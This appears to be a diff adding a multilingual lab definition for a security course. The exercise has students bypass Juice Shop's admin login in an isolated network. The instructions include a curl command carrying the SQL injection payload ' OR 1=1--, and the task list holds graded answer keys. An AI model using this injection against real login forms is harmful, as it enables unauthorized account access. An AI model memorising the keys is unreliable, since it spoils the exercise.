@@ -1,0 +1,37 @@
+id: web-juiceshop-sqli-001
+version: 1
+title: {uz: "Juice Shop: SQLi orqali admin sifatida kirish", ru: "Juice Shop: вход админом через SQLi", en: "Juice Shop: Admin login via SQLi"}
+description:
+  uz: Login formasidagi SQL injection bilan autentifikatsiyani chetlab o'ting.
+  en: Bypass authentication with SQL injection in the login form.
+category: web-security
+course: web-application-security
+lab_type: offensive
+difficulty: intermediate
+duration_minutes: 90
+instructions:
+  uz: |
+    `POST http://<shop-ip>:3000/rest/user/login` ga JSON yuboring:
+    ```bash
+    curl -s -H 'Content-Type: application/json' \
+      -d '{"email":"'"' OR 1=1--"'","password":"x"}' http://<ip>:3000/rest/user/login
+    ```
+    Qaytgan JWT tokenni `jwt.io` siz, `cut -d. -f2 | base64 -d` bilan o'qing.
+machines:
+  - {name: attacker, template: kali-linux, role: attacker}
+  - {name: shop, template: juice-shop, role: target, hidden: true}
+networks: [{name: lab, type: isolated}]
+tasks:
+  - id: find
+    title: {uz: "Do'konni toping (host)", en: "Find the shop host"}
+    points: 10
+    validation: {type: host_discovery}
+  - id: email
+    title: {uz: "Administrator email manzili", en: "Administrator email"}
+    points: 50
+    validation: {type: answer, answers: ["admin@juice-sh.op"]}
+  - id: alg
+    title: {uz: "JWT imzo algoritmi (header.alg)", en: "JWT signing algorithm"}
+    points: 40
+    validation: {type: answer, answers: ["RS256"]}
+scoring: {maximum: 100, passing: 60, xp: 180}
